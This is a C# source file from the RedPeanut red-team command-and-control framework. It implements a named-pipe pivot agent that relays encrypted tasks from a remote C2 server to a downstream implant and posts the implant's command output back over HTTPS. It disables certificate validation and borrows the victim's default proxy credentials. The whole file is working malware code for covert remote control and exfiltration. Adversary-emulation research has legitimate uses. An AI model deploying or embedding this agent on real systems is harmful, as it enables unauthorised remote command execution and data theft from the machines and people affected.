//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using RedPeanutAgent.Core;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using static RedPeanutAgent.Program;

namespace RedPeanutAgent.C2
{
    class AgentInstanceNamedPipe
    {
        private NamedPipeServerStream pipe;
        private string agentid = "";
        private string sessionkey = "";
        private string serverkey = "";
        private Utility.CookiedWebClient wc = null;
        private byte[] webaeskey;
        private byte[] webaesiv;
        Dictionary<string, List<Utility.TaskMsg>> commands = null;
        string cookie = "";
        string AgentidRelayed = "";

        string host;
        int port;
        string[] pagepost;
        string[] pageget;
        string param;

        public AgentInstanceNamedPipe(NamedPipeServerStream pipe, Worker w)
        {
            this.pipe = pipe;
            this.agentid = w.agentid;
            this.serverkey = w.serverkey;
            this.sessionkey = w.serverkey + agentid;
            this.wc = w.wc;
            host = w.host;
            port = w.port;
            pagepost = w.pagepost;
            pageget = w.pageget;
            param = w.param;

            WebHeaderCollection webHeaderCollection = new WebHeaderCollection();

            webHeaderCollection.Add(HttpRequestHeader.UserAgent, "#USERAGENT#");

            //#HEADERS#

            wc.Headers = webHeaderCollection;

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });

            //this.webaeskey = aeskey;
            //this.webaesiv = aesiv;
            this.commands = w.commands;
        }

        public string AgentId
        {
            get
            {
                return agentid;
            }
        }

        // Manage agentid request
        public void Run()
        {

            ManageAgentIdRequest();

            try
            {
                Utility.CheckInMsg msg = ManageCheckInMsg();
                if (msg != null)
                {
                    //Get checked in to server
                    //wait for command
                    do
                    {
                        try
                        {
                            //string rpaddress = String.Format("https://{0}:{1}/{2}", Program.host, Program.port, Program.pageget[new Random().Next(Program.pageget.Length)]);

                            //wc.Add(new Cookie("sessionid", cookie, "/", Program.host));

                            if (commands.ContainsKey(AgentId))
                            {
                                commands.TryGetValue(AgentId, out List<Utility.TaskMsg> list);
                                if (list.Count > 0)
                                {
                                    //Received command from server
                                    //Send command to agent and send back result to server  
                                    Utility.TaskMsg task = list.First();
                                    list.Remove(task);
                                    ManageCommand(task);
                                }
                            }
                        }
                        catch (Exception)
                        {
                        }

                        Thread.Sleep(5000);

                    } while (true);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Error during checkin agentid {0}", agentid);
                Console.WriteLine("[x] {0}", e.Message);
            }
        }

        private void ManageAgentIdRequest()
        {
            var result = Utility.ReadMessage(pipe);
            string line = Crypto.RC4.DecryptMessage(serverkey, Encoding.Default.GetString(result));
            Utility.AgentIdReqMsg msg = new JavaScriptSerializer().Deserialize<Utility.AgentIdReqMsg>(line);

            msg.AgentPivot = AgentId;

            string agentidrequesttemplate = new JavaScriptSerializer().Serialize(msg);

            //Send agentidreq to server
            string post = String.Format("{0}={1}", param, Crypto.RC4.EncryptMessage(serverkey, agentidrequesttemplate));
            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)], post);

            string resp = wc.UploadString(rpaddress, post);

            cookie = wc.ResponseCookies["sessionid"].Value;

            string respjson = Crypto.RC4.DecryptMessage(serverkey, resp);

            //Response is an AngentIdMsq it contain the encryption key and iv
            //we use this pair for realyer to agent and realyer to server

            Utility.AgentIdMsg agentIdMsg = new JavaScriptSerializer().Deserialize<Utility.AgentIdMsg>(respjson);

            //Set key and iv with value form AgentIdMsg to be used to relay message to server
            webaeskey = Convert.FromBase64String(agentIdMsg.sessionkey);
            webaesiv = Convert.FromBase64String(agentIdMsg.sessioniv);
            AgentidRelayed = agentIdMsg.agentid;
            agentid = agentIdMsg.agentid;
            SendBackAgentId(agentIdMsg);
        }

        //Send agentid
        //RC4 with serverkey
        public void SendBackAgentId(Utility.AgentIdMsg agentIdMsg)
        {
            string agentidnmsg = new JavaScriptSerializer().Serialize(agentIdMsg);
            byte[] bytes = Encoding.Default.GetBytes(Crypto.RC4.EncryptMessage(serverkey, agentidnmsg));

            pipe.Write(bytes, 0, bytes.Length);
        }

        //Send command to agent
        //AES
        public void ManageCommand(Utility.TaskMsg task)
        {
            string command_src = new JavaScriptSerializer().Serialize(task);

            StringBuilder output = new StringBuilder();
            try
            {
                //set agentid with agentpivot
                byte[] bytes = Crypto.Aes.EncryptAesMessage(command_src, webaeskey, webaesiv);
                pipe.Write(bytes, 0, bytes.Length);

                output = ReadOutput();

                wc.Add(new Cookie("sessionid", cookie, "/", host));

                // Send output to server
                string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
                Utility.SendOutputHttp(task.Instanceid, output.ToString(), wc, webaeskey, webaesiv, rpaddress, param, AgentidRelayed, agentid);
            }
            catch (IOException e)
            {
                Console.WriteLine("Error during sendcommand agent will be removed {0}", e.Message);
                //TODO remove agent from list
            }
            Console.WriteLine(output);
            Console.WriteLine();
        }

        //Read oputput from agent
        //AES
        public StringBuilder ReadOutput()
        {
            StringBuilder output = new StringBuilder();
            Utility.ResponseMsg msg = null;
            int currentindex = 0;

            do
            {
                var result = Utility.ReadMessage(pipe);


                string line = Crypto.Aes.DecryptAesMessage(result, webaeskey, webaesiv);
                msg = new JavaScriptSerializer().Deserialize<Utility.ResponseMsg>(line);
                output.Append(msg.Data);
                currentindex++;
            }
            while (currentindex < msg.Number && msg.Chunked);

            return output;
        }

        private Utility.CheckInMsg ManageCheckInMsg()
        {
            var result = Utility.ReadMessage(pipe);

            //Espect cehckin message
            string line = Crypto.Aes.DecryptAesMessage(result, webaeskey, webaesiv);

            Utility.CheckInMsg msg = new Utility.CheckInMsg();

            try
            {

                msg = new JavaScriptSerializer().Deserialize<Utility.CheckInMsg>(line);

                //Send checkin message to server
                string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);

                string checkinmsg = new JavaScriptSerializer().Serialize(msg);
                var checkinmsgenc = Crypto.Aes.EncryptAesMessage(checkinmsg, webaeskey, webaesiv);

                string post = String.Format("{0}={1}", param, Convert.ToBase64String(checkinmsgenc));

                wc.UseDefaultCredentials = true;
                wc.Proxy = WebRequest.DefaultWebProxy;
                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

                wc.Add(new Cookie("sessionid", cookie, "/", host));

                string resp = wc.UploadString(rpaddress, post);
                string respjson = Crypto.Aes.DecryptAesMessage(Convert.FromBase64String(resp), webaeskey, webaesiv);

                byte[] bytes = Crypto.Aes.EncryptAesMessage(respjson, webaeskey, webaesiv);

                pipe.Write(bytes, 0, bytes.Length);
            }
            catch (Exception e)
            {
                msg = null;
                Console.WriteLine("Error: " + e.Message);
                Console.WriteLine("Error: " + e.StackTrace);
            }
            return msg;
        }
    }
}
